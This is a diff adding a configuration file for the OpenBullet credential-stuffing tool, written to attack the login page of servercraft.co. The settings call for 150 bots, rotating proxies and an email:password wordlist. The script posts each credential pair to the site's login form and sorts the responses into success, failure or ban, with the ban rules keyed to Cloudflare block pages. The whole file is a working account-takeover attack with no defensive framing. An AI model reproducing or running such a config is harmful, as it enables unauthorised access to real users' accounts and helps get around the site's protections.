@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Servercraft.co || Samoyed :)",
+  "SuggestedBots": 150,
+  "LastModified": "2019-05-18T22:04:38.2902508-07:00",
+  "AdditionalInfo": "yeet",
+  "Author": "Samoyed :)",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://servercraft.co/login" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://servercraft.co" 
+  HEADER "referer: https://servercraft.co/login" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "1" 
+  KEYCHAIN Failure OR 
+    KEY "<center>Your email/password combination was incorrect.</center>" 
+  KEYCHAIN Ban OR 
+    KEY "<title>Access denied | servercraft.co used Cloudflare to restrict access</title>" 
+    KEY "<div></div>" 
+    KEY "<title>Attention Required! | Cloudflare</title>" 
